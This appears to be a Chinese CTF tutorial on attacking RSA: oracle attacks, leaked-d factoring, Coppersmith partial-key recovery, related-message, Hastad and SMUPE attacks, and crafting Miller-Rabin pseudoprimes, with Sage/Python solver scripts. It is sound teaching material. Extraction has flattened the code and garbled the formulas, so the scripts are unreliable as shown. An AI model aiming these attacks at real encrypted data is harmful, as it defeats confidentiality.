int(upper)   e = c = n = c_of_2 = pow(2,e,n)m = partial((c * c_of_2) % n, n)print(long_to_bytes(m))\n\nbyte oracle场景  假设目前存在一个 Oracle，它会对一个给定的密文进行解密，并且会给出明文的最后一个字节。那么给定一个加密后的密文，我们只需要 log256n 次就可以知道这个密文对应的明文消息。\n解法  是 parity oracle 的扩展，此时泄露一个 byte，因此我们将原来的发送 C×2e 改成 C×256e 即可\n已知\nC&#x3D;PemodN\n第一次我们发送\nC×256e&#x3D;(256P)emodN\n服务器返回 256PmodN\n此时有：\n\n256P 为偶数\nN 为奇数\n\n由于 P&lt;N, 我们有 256PmodN&#x3D;256P−kN(k&lt;256)，并且对于不同的，k1，k2, 我们有 256P−k1n≢256P−k2nmod256\n由于是模 256，所以 256P−kn≡−knmod256，因此我们首先可以枚举 0−255 情况下的最后一个字节，并得到映射表\n当服务器返回最后一个字节 b，我们就可以通过映射表得到 k，即减去了 k 个 N，有 kN≤256P≤(k+1)N\n归纳：\n假设在第 i 次时，有\nxN&#x2F;256i≤P&lt;(x+1)N&#x2F;256i\n当第 i+1 次时，发送 C∗256(i+1)e，服务器返回\n256i+1PmodN&#x3D;256i+1P−kN\n0≤256i+1P−kN&lt;N\nkN&#x2F;256i+1≤P&lt;256(x+1)N&#x2F;256i+1\n总结：\nlb = 0ub = Nk = mab[b]interval = (ub-lb)/256lb = lb + interval * kub = lb + intervalfrom pwn import *import timeimport binasciifrom Crypto.Cipher import AESfrom Crypto.Util.number import long_to_bytesfrom gmpy2 import invertp = remote(ip,port)e =c = n = print(&quot;e:&quot;,e)print(&quot;c:&quot;,c)print(&quot;n:&quot;,n)d = &#123;&#125;for k in range(0,256):    d[(-k*n)%256] = kprint(d)lb = 0ub = nfor i in range(1,256):    m = (c * pow(256,i*e,n)) %n    p.sendline(str(m))    b = int(p.recvline())    k = d[b]    interval = int((ub-lb)/256)    lb = lb + interval * k    ub = lb + interval    print(&quot;ub-lb:&quot;,ub-lb)print(&quot;lb:&quot;,lb)print(&quot;ub:&quot;,ub)i = lb# 没控制好边界，所以最后暴力一段while(i&lt;=lb+30000):    m = pow(i,e,n)    if(m==c):        print(&quot;result:&quot;,i)        p.sendline(str(i))        print(p.recvline())        exit(0)    i+=1print(&quot;no result&quot;)\n\nd 泄露攻击  场景  题目同时给出了 d、e 和 N\n解法  我们知道 ed≡1modφ(n)，则存在 k，使得\ned−1&#x3D;kφ(n)\n又有∀a∈Zn∗，满足 aed−1≡1modn，令\ned−1&#x3D;2st\n其中，t 是一奇数，可以证明对于至少一半的∀a∈Zn∗，存在一个 i∈[1,s]，使得\n\n成立，如果 a,i 满足上述条件，可以对 n 进行暴力分解\nimport fractions,randomdef factor_modulus(n, d, e):    &quot;&quot;&quot;    Efficiently recover non-trivial factors of n    See: Handbook of Applied Cryptography    8.2.2 Security of RSA -&gt; (i) Relation to factoring (p.287)    http://www.cacr.math.uwaterloo.ca/hac/    &quot;&quot;&quot;    t = (e * d - 1)    s = 0    while True:        quotient, remainder = divmod(t, 2)        if remainder != 0:            break        s += 1        t = quotient    found = False    while not found:        i = 1        a = random.randint(1,n-1)        while i &lt;= s and not found:            c1 = pow(a, pow(2, i-1, n) * t, n)            c2 = pow(a, pow(2, i, n) * t, n)            found = c1 != 1 and c1 != (-1 % n) and c2 == 1            i += 1    p = fractions.gcd(c1-1, n)    q = n // p    return p, q\n\nn 多因子  场景  当 n 由多个因子组成时\n解法  多个因子时，我们根据欧拉函数求得对应的φ(n)即可\nφ(x)&#x3D;x∏i&#x3D;1n(1−1&#x2F;pi)\n其中 pi 是 x 的所有质因数\n选择明文攻击  场景  存在一个加密 Oracle，能够返回加密后的密文。求出对应的 e 和 n\n解法  求解 e当 e 较小时，可以通过 sage 的 bsgs 函数求得 e\n# sage -python script.pyfrom sage.all import *n = n = Zmod(n)m = m = ZmodN(m)c = c = ZmodN(c)print(bsgs(m,c,(3, 2 ** 40)))\n\n求解 n分别加密、、、2、4、8、16…\n我们可以得到：\nc2&#x3D;2emodn\nc4&#x3D;4emodn\nc8&#x3D;8emodn\n那么：\nc22≡c4modn\nc23≡c8modn\n所以有：\nc22−c4&#x3D;kn\nc23−c8&#x3D;tn\n最后求得他们的公因子就是 n，使用的 Oracle 数据越多，公因子是 n 的概率越大\nfrom pwm import *import libnump = remote(ip,port)p.recvuntil(&quot;m: &quot;)p.sendline(&quot;2&quot;)c2 = int(p.recvline())p.recvuntil(&quot;m: &quot;)p.sendline(&quot;4&quot;)c4 = int(p.recvline())p.recvuntil(&quot;m: &quot;)p.sendline(&quot;8&quot;)c8 = int(p.recvline())p.recvuntil(&quot;m: &quot;)p.sendline(&quot;16&quot;)c16 = int(p.recvline())p.recvuntil(&quot;m: &quot;)p.sendline(&quot;32&quot;)c32 = int(p.recvline())pn = pow(c2,2)-c4qn = pow(c2,3)-c8rn = pow(c2,4)-c16sn = pow(c2,5)-c32l = []n = libnum.xgcd(pn,qn)[2]l.append(n)n = libnum.xgcd(pn,rn)[2]l.append(n)n = libnum.xgcd(pn,sn)[2]l.append(n)n = libnum.xgcd(qn,rn)[2]l.append(n)n = libnum.xgcd(qn,sn)[2]l.append(n)n = libnum.xgcd(rn,sn)[2]l.append(n)n = 0for _ in l:    if(l.count(_)&gt;=3):        n = _if(n==0):    print(&quot;nope&quot;)    exit(0)else:    print(&quot;n:&quot;,n)\n\n\n第三部分是基本的 Coppersmith 相关内容\n\n依赖库：\n\ngmpy2\npycrypto\npwntools\nsage\n\n引子c&#x3D;memodN, 当 |m|&lt;N1&#x2F;e 时，我们能很快求得 m 的值\n当 |m|&gt;N1&#x2F;e 时，如果已知 m 的部分信息 m0，能不能恢复未知 x 的值，这就是 Corppersmith 要解决的问题\nc&#x3D;(m0+x)emodN\n已知部分明文攻击  引理 1\n假设 N 是一个未知因子组成的数，且存在一个因子 b≥Nβ,0&lt;β≤1,f(x) 是一个一元δ阶多项式，且 c≥1，那么可以在 O(cδ5log9(N))复杂度内求解下列等式的所有的 x0\nf(x)&#x3D;0modb,|x0|≤cNβ2&#x2F;δ\n场景  设 m&#x3D;m0+x0，其中 x0 是未知的，那么我们可以列出以下多项式\nf(x)&#x3D;(m0+x)e−cmodN,f(x0)&#x3D;0\n当 e 和 x0 很小的时候，Coppersmith 就能求出 x0 的值\n解法  在这个场景中，我们知道 b&#x3D;N,δ&#x3D;e,β&#x3D;1，设 c&#x3D;1，此时 |x0|≤cNβ2&#x2F;δ&#x3D;N1&#x2F;e，因此，为了求解 x0，我们需要知道原消息 m 至少 (1-1/e)*N.bit_length() 比特的信息\n碰到的最常见的是已知明文高位攻击，但其实未知的部分在哪里都可以，只要是连贯的，就能构造对应的 f(x)进行求解\n已知明文高位e = c = n = kbits = # x 的未知 bit 数目m0 =  #明文的高位信息PR.&lt;x&gt; = PolynomialRing(Zmod(n))f = (m0 + x)^e - cf = f.monic()x0 = f.small_roots(X=2^kbits,beta=1)[0] # 在 0 - 2^kbits 范围内求解小根，beta 为 1 和上述分析的 beta 一致，也就是对应 factor 为 Nprint(x0)\n\n已知明文低位  将构造的函数改为以下即可\nf = ((m0 + ZmodN((pow(2,m0.nbits())))*x)^e) - c\n\n\n当然, 如果是明文的中间部分 bit 未知，也是相同的去修改对应的多项式 f(x)即可，具体题目见https://cryptohack.org/challenges/rsa/ 中的 Null or Never 题目（Coppersmith 是该题的一种解法）\n\n已知部分 p 攻击  场景  已知 p&#x3D;p0+x, 且 |x|&lt;N1&#x2F;4 时，也就是知道 p 的大约一半 bits 信息时，可以得到对应的 x，从而对 N 进行分解\n解法  此时根据 p&#x3D;p0+x0 我们知道 p0&#x3D;x0modp，所以可以列出多项式，f(x)&#x3D;p0−xmodp，f(x0)&#x3D;0modp\n对应到引理中，显然 b&#x3D;p，由于在 RSA 中，和 p 和 q 经常为同比特的素数，所以设置，beta&#x3D;0.4，0.3 等都可\n已知 p 高位n = p0 = # 已知的 p 的高位kbits = PR.&lt;x&gt; = PolynomialRing(Zmod(n))f = x + p0f = f.monic()x0 = f.small_roots(X=2^kbits, beta=0.3)[0] # beta=0.3 表明存在 factor 大于 n ^0.3print(x0 + p0)\n\n已知 p 低位  同样的，已知 p 低位或者中间部分未知，修改对应的 f(x)的表达式即可，例如已知 p 低位，则\nZmodN=Zmod(n)f(x) = x*ZmodN(pow(2,p0.nbits()))+p0\n\n部分私钥暴露攻击  场景  当已知私钥的部分 bit 信息，私钥 d&#x3D;d0+x，d0 的 bit 数目约为 d 的 1&#x2F;4 时，可以恢复私钥 d\n解法  根据论文《An Attack on RSA Given a Small Fraction of the Private Key Bits》\n假设私钥 d 的 bit 数目为 kbits, 且已知的是私钥的低位\n那么我们可以知道 d0&#x3D;dmod2kbits\n所以有 ed0&#x3D;1+k(N−s+1)mod2kbits,(s&#x3D;p+q)\n所以我们可以通过解 ed0x−kx(N−x+1)&#x3D;xmod2kbits 得到可能的 smod2kbits 的值，继续通过求解 p2−sp+N&#x3D;0mod2kbits，就能得到 pmod2kbits 的值了，进而把问题转换为已知部分 p 攻击。下面这个日本大哥的脚本是把 1、2 两步结合起来列式了，所以只求一个方程解出了部分 p\ndef partial_p(p0, kbits, n):    PR.&lt;x&gt; = PolynomialRing(Zmod(n))    nbits = n.nbits()    f = 2^kbits*x + p0    f = f.monic()    roots = f.small_roots(X=2^(nbits//2-kbits), beta=0.3)  # find root &lt; 2^(nbits//2-kbits) with factor &gt;= n^0.3，在实际使用脚本的时候可以自己手动改 nbits 等参数，理解了原理再看脚本就很清楚明了了    if roots:        x0 = roots[0]        p = gcd(2^kbits*x0 + p0, n)        return ZZ(p)def find_p(d0, kbits, e, n):    X = var(&#x27;X&#x27;)    for k in xrange(1, e+1):        results = solve_mod([e*d0*X - k*X*(n-X+1) + k*n == X], 2^kbits)        for x in results:            p0 = ZZ(x[0])            p = partial_p(p0, kbits, n)            if p:                return pif __name__ == &#x27;__main__&#x27;:    n =    e =     d0 = \t\tkbits = # 未知的 d 的 bits 数目    p = find_p(d0, kbits, e, n)    print(&quot;found p: %d&quot; % p)    q = n//p    print(inverse_mod(e, (p-1)*(q-1)))\n\n如果将 1、2 两步分开列式，则修改函数 find_p 如下\ndef find_p(d0, kbits, e, n):    X = var(&#x27;X&#x27;)    for k in range(1, e+1):        results = solve_mod([e*d0*X - k*X*(n-X+1)== X], 2^kbits)        for x in results:            s = ZZ(x[0])            pvar = var(&#x27;p&#x27;)            p_results = solve_mod([pvar*pvar-s*pvar+n==0],2^kbits)            for p0 in p_results:                p0 = ZZ(p0[0])                p = partial_p(p0, kbits, n)                if p:                    return p\n\n但是速度上好像慢一些。\n\n同样的已知 d 高位等也可以进行求解，例如已知 d 高位，那么第一步解出来的其实是可能的 p 的低位，所以在解部分 p 时，修改 f &#x3D; (2^kbits)*x + p0 即可\n\n例题：2020 天翼杯 hardRSA题目脚本：\n# chall.py# flag&#123;6809781d08e120627e623dcdafe26b8a&#125;p = getPrime(510)q = getPrime(510)r = getPrime(510)e = 7m = bytes_to_long(os.urandom(30) + flag)n = p * q * rd = invert(e, (p - 1) * (q - 1) * (r - 1))c = pow(m, e, n)print(n // p)print(p)print(c)print(hex(d % (1 &lt;&lt; 540)))\n\n从题目看也是 Coppersmith partial d 的情况，只是这里由于 n 由、、p、q、r 三个素数组成，因此需要我们重新推导同余方程\n已知：kbits&#x3D;540、p、qr、d0 的值，d0&#x3D;dmod2kbits\n推导如下：(1)ed0&#x3D;1+k(p−1)(q−1)(r−1) &#x3D;1+k(pq−p−q+1)(r−1) &#x3D;1+k(pqr−pr−qr−1−pq+p+q+r) &#x3D;1+k(N−p(r+q)+s−qr−1) &#x3D;1+k(N−p(r+q)+(r+q)+p−qr−1) &#x3D;1+k(N−ps+s+p−qr−1) &#x3D;1+k(p−1)(qr−s+1)mod2kbits,(s&#x3D;q+r)通过上式可以求得所有的 smod2kbits 的值，同时我们知道(2)q2−sq+qr&#x3D;0mod2kbits 联立公式 1×q 和公式 2×k(p−1)，可以得到公式\n(3)ed0q&#x3D;q+kq(p−1)(qr−s+1)\n(4)k(p−1)qr&#x3D;kq(p−1)(s−q)\n相加得到：\ned0q+k(p−1)qr&#x3D;q+kq(p−1)(qr−q+1)\n即：\ned0q+k(p−1)qr−k(p−1)q(qr−q+1)&#x3D;qmod2kbits\n解上述同余方程，即可得到 qmod2kbits\n由于 kbits&#x3D;540，而 q 只有 510bits，所以解出来的就是可能的 q 的值，再通过 qr 过滤即可\ndef find_q(d0, kbits, e, qr, p):    X = var(&#x27;X&#x27;)    for k in range(1, e + 1):        temp = k*(p-1)        results = solve_mod([e*d0*X+temp*qr-temp*X*(qr-X+1)==X], 2 ^ kbits)        for x in results:            q = ZZ(x[0])            if qr % q == 0:                return q    return Noneif __name__ == &#x27;__main__&#x27;:    qr = 6857671284539062742975668483013695756136974308830302383869017675211748459038460434623218652374536550644287079851235538790745857383008797698872874798021995947967308637270510423795384863442755166813716746318469915880844736019524077541319597047087620854791342900521099848683663304636436936596021386279685708537    p = 2141698433991046082370939321691850154692026423424010392532982575546199921995522418737105878977898158159119041866620684371362271661642476751663585379591337    c = 4329606906986929520922207896899782825966852252045645553852666134465727605375552409314262439896695961792039946511877813768609658516837096110397826574615865145364406310497152725490038135469839136190625952342503082553246584871237205558902774064100332461452316195663446307120094941991930964324406679011451626126064494215289724959537793057773764253924636259378833228904446486925068109314698993641720938647836132806653451109926428309922461595730642461604303078237048    d0 = 0x8e6f66a517d9c8a610eb65dac5a613e72d47a29beaa5c77a9eb857e0db5d09eadf3a317776fdf27b0d85db0b6677afc8e0683d6dc2b4580281b6e99c3050f649213c37    e = 7    kbits = 540    q = find_q(d0, kbits, e, qr, p)    print(q)    # q = 2505948797318027758820680066583904581437202552654881626817593379353882875609223855015707273771918291251411562855290697544161987271016184806489110771554269\n\nshort padding attack场景 Short padding attack 经常和 相关消息攻击结合 (https://blog.ycdxsb.cn/2decc525.html#more) 使用\n我们已知 c1&#x3D;memodn，c2&#x3D;(m+padding)emodn，但我们不知道具体的 padding 值是多少\n解法  首先通过 short padding attack 求出padding 的值，然后再使用相关消息攻击求得消息 m\ndef short_pad_attack(c1, c2, e, n):    PRxy.&lt;x,y&gt; = PolynomialRing(Zmod(n))    PRx.&lt;xn&gt; = PolynomialRing(Zmod(n))    PRZZ.&lt;xz,yz&gt; = PolynomialRing(Zmod(n))    g1 = x^e - c1    g2 = (x+y)^e - c2    q1 = g1.change_ring(PRZZ)    q2 = g2.change_ring(PRZZ)    h = q2.resultant(q1)    h = h.univariate_polynomial()    h = h.change_ring(PRx).subs(y=xn)    h = h.monic()    kbits = n.nbits()//(2*e*e)    diff = h.small_roots(X=2^kbits, beta=0.5)[0]  # find root &lt; 2^kbits with factor &gt;= n^0.5    return diff  def related_message_attack(c1, c2, diff, e, n):    PRx.&lt;x&gt; = PolynomialRing(Zmod(n))    g1 = x^e - c1    g2 = (x+diff)^e - c2    def gcd(g1, g2):        while g2:            g1, g2 = g2, g1 % g2        return g1.monic()    return -gcd(g1, g2)[0]\n\n\n第四部分是相关消息的内容\n\n依赖库：\n\ngmpy2\npycrypto\npwntools\nsage\n\n线性相关消息  场景  这是相关消息攻击最简单的一种形式，已知，c1&#x3D;m1emodN,c2&#x3D;(am1+b)emodN，m2&#x3D;am1+b\n解法  可以看到两次加密的消息 m1 和 m2 存在线性关系，当 e&#x3D;3 时，根据推导(见《Low-Exponent RSA with Related Messages》)，可以得到以下关系\nm1&#x3D;bac2+2a3c1−b3c2−a3c1+2b3，因此可以根据已知的、、、c1、c2、a、b 轻松得到消息 m1（注意，这里的除法是求逆元的意思）\n# pythonfrom gmpy2 import invertdef getmessage(a, b, c1, c2, n):    b3 = pow(b, 3, n)    a3 = pow(a, 3, n)    part1 = b * (c2 + 2 * c1 * a3 - b3) % n    part2 = a * (c2 - c1 * a3 + 2 * b3) % n    part2 = invert(part2, n)    return part1 * part2 % n\n\n进阶  下面是论文中的通用情况，即 c1&#x3D;(a1m+b1)emodn，c2&#x3D;(a2m+b2)emodn，不通过前面推公式的方法，只需要通过 gcd 即可求得对应的消息。由于式子(a1m+b1)e−c1modn 和(a2m+b2)e−c2modn 都必然存在公共的 x−m 的根，因此通过 gcd 求得 x−m，即可得到对应的消息 m，\n# sagedef gcd(g1, g2):    while g2:        g1, g2 = g2, g1 % g2    return g1.monic()    n = a1 = b1 = c1 = a2 = b2 = e = 3c2 = PR.&lt;x&gt;= PolynomialRing(Zmod(n))g1 = (a1*x+b1)^e-c1g2 = (a2*x+b2)^e-c2print(-gcd(g1, g2)[0])\n\n多消息相关  场景  假设存在 k 个消息，它们有关系式 P0(x1,x2,…xk)&#x3D;p(x1,x2,…xk)&#x3D;0modN\n并且有 Pi(xi)&#x3D;xie−ci&#x3D;0modN，需要求解这 k 个消息\n解法  根据这 k+1 个等式，我们计算 Groebner 基 Groebner([P0,P1,…Pk])，可以得到结果[x1−m1,…xk−mk]，\n也就求得了所有的 k 个消息\n以下举例论文中比较特殊的线性相关消息，即 P0(x1,x2…xk)&#x3D;x1+x2+…xk−w&#x3D;0\n# pythonfrom Crypto.Util.number import getPrime, bytes_to_longp = getPrime(512)q = getPrime(512)n = p * qe = 3m1 = bytes_to_long(b&quot;flag&#123;This_is_flag1&#125;&quot;)m2 = bytes_to_long(b&quot;flag&#123;This_is_flag2&#125;&quot;)m3 = m1+m2+10000print(n)print(pow(m1,e,n))print(pow(m2,e,n))print(pow(m3,e,n))&#x27;&#x27;&#x27;108684504406001730978107355065522913091470167674222436489722232508562878942265531378563853986279259519842855383477949581415300994618557266600557629814170912555530200441331549267805294484355321505430150563949802485514426432450612355535035910835277447960752175362457165729276266536456917482476441605301749223673119166778589125956267413038030487630732650620842328196991520390707794486038399436452214505686505591977538042950908921943069636790519051251191667785891259562674130380304876307326506609103609003998596754926376666626077239053372039750680548450198110583544231272374300456426378195333422871300765013930430424390104586121138764086629711853351243347558333657355599432416841199469970564180649403376333107226365096683496&#x27;&#x27;&#x27;\n\n解的脚本如下：\n# sagee = 3cnt = 3N=108684504406001730978107355065522913091470167674222436489722232508562878942265531378563853986279259519842855383477949581415300994618557266600557629814170912555530200441331549267805294484355321505430150563949802485514426432450612355535035910835277447960752175362457165729276266536456917482476441605301749223673c1=11916677858912595626741303803048763073265062084232819699152039070779448603839943645221450568650559197753804295090892194306963679051905125c2=11916677858912595626741303803048763073265066091036090039985967549263766666260772390533720397506805484501981105835442312723743004564263781c3=95333422871300765013930430424390104586121138764086629711853351243347558333657355599432416841199469970564180649403376333107226365096683496c = [c1,c2,c3]PR = PolynomialRing(Zmod(N), &#x27;x&#x27;, cnt)x = PR.gens()F = []for i in range(cnt):    F.append(pow(x[i],e)-c[i])F.append(x[0]+x[1]-x[2]+10000)I = Ideal(F)G= I.groebner_basis()for b in G[:-1]:    mi = ZZ(-b(0, 0, 0))    print(bytes.fromhex(hex(mi)[2:]))&#x27;&#x27;&#x27;b&#x27;flag&#123;This_is_flag1&#125;&#x27;b&#x27;flag&#123;This_is_flag2&#125;&#x27;&#x27;&#x27;&#x27;\n\nHastad 攻击  场景  前面的两个相关消息攻击模数都是相同的，而在 Hasted 广播攻击中则不同\n使用不同但互质的模数 n，相同的指数 e、加密 e 个明文得到 e 个密文，即 ci&#x3D;(aix+bi)emodni,i&#x3D;1,2…e\n解法  通过这 e 个式子，我们有 e 个等式：，(aix+bi)e−ci≡0modni，i&#x3D;1,2…e\n由于这 e 个式子中，模数都是互质的，那么通过中国剩余定理，我们可以得到，P(x)≡0modM，M&#x3D;∏i&#x3D;1eni，而 P(x)又必然存在唯一解，并满足 LLL 算法约束，因此可以通过 sage 的small_roots函数解得，以下给出两个写法分别来自https://github.com/ValarDragon/CTF-Crypto/blob/master/RSA/hastads.sage 和 https://xz.aliyun.com/t/6813\n# sagedef linearPaddingHastads1(cArray, nArray, aArray, bArray, e=3, eps=1/8):    &quot;&quot;&quot;    Performs Hastads attack on raw RSA with no padding.    This is for RSA encryptions of the form: cArray[i] = pow(aArray[i]*msg + bArray[i],e,nArray[i])    Where they are all encryptions of the same message.    cArray = Ciphertext Array    nArray = Modulus Array    aArray = Array of &#x27;slopes&#x27; for the linear padding    bArray = Array of &#x27;y-intercepts&#x27; for the linear padding    e = public exponent    &quot;&quot;&quot;    if(len(cArray) == len(nArray) == len(aArray) == len(bArray) == e):        for i in range(e):            cArray[i] = Integer(cArray[i])            nArray[i] = Integer(nArray[i])            aArray[i] = Integer(aArray[i])            bArray[i] = Integer(bArray[i])        TArray = [-1]*e        for i in range(e):            arrayToCRT = [0]*e            arrayToCRT[i] = 1            TArray[i] = crt(arrayToCRT, nArray)        P.&lt;x&gt; = PolynomialRing(Zmod(prod(nArray)))        gArray = [-1]*e        for i in range(e):            gArray[i] = TArray[i]*(pow(aArray[i]*x + bArray[i], e) - cArray[i])        g = sum(gArray)        g = g.monic()        # Use Sage&#x27;s inbuilt coppersmith method        roots = g.small_roots(epsilon=eps)        if(len(roots) == 0):            print(&quot;No Solutions found&quot;)            return -1        return roots[0]    else:        print(&quot;CiphertextArray, ModulusArray, and the linear padding arrays need to be of the same length,&quot; +              &quot;and the same size as the public exponent&quot;)def linearPaddingHastads2(cArray, nArray, aArray, bArray, e=3, eps=1/8):    cnt = e    PR = PolynomialRing(ZZ, &#x27;x&#x27;)    x = PR.gen()    Fs = []    for i in range(cnt):        f = PR((A[i]*x + B[i])**e - Cs[i])        ff = f.change_ring(Zmod(Ns[i]))        ff = ff.monic()        f = ff.change_ring(ZZ)        Fs.append(f)    F = crt(Fs, Ns)    M = reduce(lambda x, y: x * y, Ns)    FF = F.change_ring(Zmod(M))    m = FF.small_roots(epsilon=1/16)    if m:        return m[0]    else:        return None\n\nSMUPE 问题  场景  在经历了模数相同的相关消息攻击，也看过了模数不同的 Hastad 攻击，但是我们的指数 e 始终是一致的，SMUPE 问题是论文《Solving Systems of Modular Equations in One Variable: How Many RSA-Encrypted Messages Does Eve Need to Know? 》中提出的，不仅模数不同，且指数 e 也不同，具体如下：\n假如我们有 k 个式子，ci&#x3D;(aix+bi)eimodni,i&#x3D;1,2…k，此时如何求解未知的消息呢\n解法  示例 1：以论文中为例，已有 4 个公钥 (e,N) 分别为(3,N1),(3,N2),(5,N3),(5,N4)，且有 ci&#x3D;(aix+bi)eimodNi,i&#x3D;1,2…4\n由于阶次不同，无法直接进行 CRT，因此需要构造得到同阶次的式子进行 CRT。\nCs = [...]PKs =  [(3,..), (3,..), (5,..), (5,..)]cnt = 4A = []B = []PR = PolynomialRing(ZZ, &#x27;x&#x27;)x = PR.gen()Fs = []for i in range(cnt):    f =  PR(( A[i]*x + B[i] )**PKs[i][0] - Cs[i] )    ff = f.change_ring(Zmod(PKs[i][1]) )    ff = ff.monic()    f = ff.change_ring(ZZ)    Fs.append(f)F = crt([ Fs[0]**2, Fs[1]**2, x*Fs[2], x*Fs[3] ], [PKs[i][1] for i in range(cnt) ] )M = reduce(lambda x, y: x * y, [ PKs[i][1] for i in range(cnt) ] )FF = F.change_ring(Zmod(M) )m = FF.small_roots(X=2**760, beta=7./8)[0]print(m)\n\n示例 2：\n也是为了更加深入理解这个构造，在此示例中，e 分别为 2 和 3\nc1 = c2 = a1 = a2 = b1 = b2 = Cs = [c1, c2]A = [a1, a2]B = [b1, b2]cnt = 2PKs = [(2,n1), (3,n2)]PR = PolynomialRing(ZZ, &#x27;x&#x27;)x = PR.gen()Fs = []for i in range(cnt):    f =  PR(( A[i]*x + B[i] )**PKs[i][0] - Cs[i] )    ff = f.change_ring(Zmod(PKs[i][1]) )    ff = ff.monic()    f = ff.change_ring(ZZ)    Fs.append(f)F = crt([ Fs[0]*x, Fs[1]], [PKs[i][1] for i in range(cnt) ] )M = reduce(lambda x, y: x * y, [ PKs[i][1] for i in range(cnt) ] )FF = F.change_ring(Zmod(M) )m = FF.small_roots(epsilon=1.0/16)[0]print(m)\n\nPS：small_roots的参数需要根据实际情况进行调整\nLet `N` be the characteristic of the base ring this polynomial  is defined over: ``N = self.base_ring().characteristic()``.  This method returns small roots of this polynomial modulo some  factor `b` of `N` with the constraint that `b &gt;= N^\\beta`.  Small in this context means that if `x` is a root of `f`  modulo `b` then `|x| &lt; X`. This `X` is either provided by the  user or the maximum `X` is chosen such that this algorithm  terminates in polynomial time. If `X` is chosen automatically  it is `X = ceil(1/2 N^&#123;\\beta^2/\\delta - \\epsilon&#125;)`.  The algorithm may also return some roots which are larger than `X`.  &#x27;This algorithm&#x27; in this context means Coppersmith&#x27;s algorithm for finding  small roots using the LLL algorithm. The implementation of this algorithm  follows Alexander May&#x27;s PhD thesis referenced below.  INPUT:  - ``X`` -- an absolute bound for the root (default: see above)  - ``beta`` -- compute a root mod `b` where `b` is a factor of `N` and `b    \\ge N^\\beta`. (Default: 1.0, so `b = N`.)  - ``epsilon`` -- the parameter `\\epsilon` described above. (Default: `\\beta/8`)  - ``**kwds`` -- passed through to method :meth:`Matrix_integer_dense.LLL()\n\n绕过 Miller-Rabin 素性测试  题目要求在 2**600 到2**900范围内找到一个数，这个数不是质数，但可以通过 Miller-Rabin 素性测试\ndef generate_basis(n):    basis = [True] * n    for i in range(3, int(n**0.5)+1, 2):        if basis[i]:            basis[i*i::2*i] = [False]*((n-i*i-1)//(2*i)+1)    return [2] + [i for i in range(3, n, 2) if basis[i]]def miller_rabin(n, b):    &quot;&quot;&quot;    Miller Rabin test testing over all    prime basis &lt; b    &quot;&quot;&quot;    basis = generate_basis(b)    if n == 2 or n == 3:        return True    if n % 2 == 0:        return False    r, s = 0, n - 1    while s % 2 == 0:        r += 1        s //= 2    for b in basis:        x = pow(b, s, n)        if x == 1 or x == n - 1:            continue        for _ in range(r - 1):            x = pow(x, 2, n)            if x == n - 1:                break        else:            return False    return True  miller_rabin(p,64)\n\n从虽然从参考资料中的论文给出了一些示例，但都不符合题目的限制，不过好在参考资料的 appendix A 里给了十分完整的示例，可以对着复现和验证\n假设我们的伪素数 n&#x3D;p1p2…ph，其中 pi 是不同的素数，使得 n 是基 a1,a2…at 下的伪素数，在本文中，h&#x3D;3\n论文中的方法是先找到一个 p1，然后生成 pi&#x3D;ki(pi−1)+1，最后合成伪素数 n\n找 p1 的步骤如下\nStep1：求 Sa\n显然对于 miller_rabin(p,64) 而言，我们的 A 为 64 以下的所有质数，求 A 如下\ndef generate_basis(n):    basis = [True] * n    for i in range(3, int(n**0.5)+1, 2):        if basis[i]:            basis[i*i::2*i] = [False]*((n-i*i-1)//(2*i)+1)    return [2] + [i for i in range(3, n, 2) if basis[i]]A = generate_basis(64)print(&#x27;A:&#x27;, A)# [2, 3, 5, 7, 11, 13, 17, 19, 23, 29, 31, 37, 41, 43, 47, 53, 59, 61]\n\n而我们要求的 Sa 集合，它要求，对于每个基 a，在3~(4*a-1) 范围内所有与 a 的Jacobi结果为 -1 的数字的集合，如下\nSa = &#123;&#125;print(&quot;Sa: &quot;)for a in A:    Sa[a] = []    for _ in range(3, 4*a-1, 2):        if libnum.jacobi(a, _) == -1:            Sa[a].append(_)    print(a, Sa[a])&#x27;&#x27;&#x27;Sa:2 [3, 5]3 [5, 7]5 [3, 7, 13, 17]7 [5, 11, 13, 15, 17, 23]11 [3, 13, 15, 17, 21, 23, 27, 29, 31, 41]13 [5, 7, 11, 15, 19, 21, 31, 33, 37, 41, 45, 47]17 [3, 5, 7, 11, 23, 27, 29, 31, 37, 39, 41, 45, 57, 61, 63, 65]19 [7, 11, 13, 21, 23, 29, 33, 35, 37, 39, 41, 43, 47, 53, 55, 63, 65, 69]23 [3, 5, 17, 21, 27, 31, 33, 35, 37, 39, 45, 47, 53, 55, 57, 59, 61, 65, 71, 75, 87, 89]29 [3, 11, 15, 17, 19, 21, 27, 31, 37, 39, 41, 43, 47, 55, 61, 69, 73, 75, 77, 79, 85, 89, 95, 97, 99, 101, 105, 113]31 [7, 13, 17, 19, 21, 29, 35, 37, 39, 47, 51, 53, 57, 59, 61, 63, 65, 67, 71, 73, 77, 85, 87, 89, 95, 103, 105, 107, 111, 117]37 [5, 13, 15, 17, 19, 23, 29, 31, 35, 39, 43, 45, 51, 55, 57, 59, 61, 69, 79, 87, 89, 91, 93, 97, 103, 105, 109, 113, 117, 119, 125, 129, 131, 133, 135, 143]41 [3, 7, 11, 13, 15, 17, 19, 27, 29, 35, 47, 53, 55, 63, 65, 67, 69, 71, 75, 79, 85, 89, 93, 95, 97, 99, 101, 109, 111, 117, 129, 135, 137, 145, 147, 149, 151, 153, 157, 161]43 [5, 11, 15, 23, 29, 31, 33, 35, 37, 45, 47, 59, 61, 65, 67, 69, 73, 77, 79, 83, 85, 87, 89, 93, 95, 99, 103, 105, 107, 111, 113, 125, 127, 135, 137, 139, 141, 143, 149, 157, 161, 167]47 [3, 5, 7, 13, 27, 29, 33, 41, 45, 51, 55, 57, 59, 63, 69, 71, 73, 75, 77, 79, 83, 85, 93, 95, 103, 105, 109, 111, 113, 115, 117, 119, 125, 129, 131, 133, 137, 143, 147, 155, 159, 161, 175, 181, 183, 185]53 [3, 5, 19, 21, 23, 27, 31, 33, 35, 39, 41, 45, 51, 55, 61, 65, 67, 71, 73, 75, 79, 83, 85, 87, 101, 103, 109, 111, 125, 127, 129, 133, 137, 139, 141, 145, 147, 151, 157, 161, 167, 171, 173, 177, 179, 181, 185, 189, 191, 193, 207, 209]59 [3, 7, 13, 15, 19, 27, 33, 35, 37, 51, 61, 63, 65, 69, 71, 73, 75, 77, 79, 87, 89, 93, 95, 97, 101, 107, 109, 113, 117, 119, 123, 127, 129, 135, 139, 141, 143, 147, 149, 157, 159, 161, 163, 165, 167, 171, 173, 175, 185, 199, 201, 203, 209, 217, 221, 223, 229, 233]61 [7, 11, 17, 21, 23, 29, 31, 33, 35, 37, 43, 51, 53, 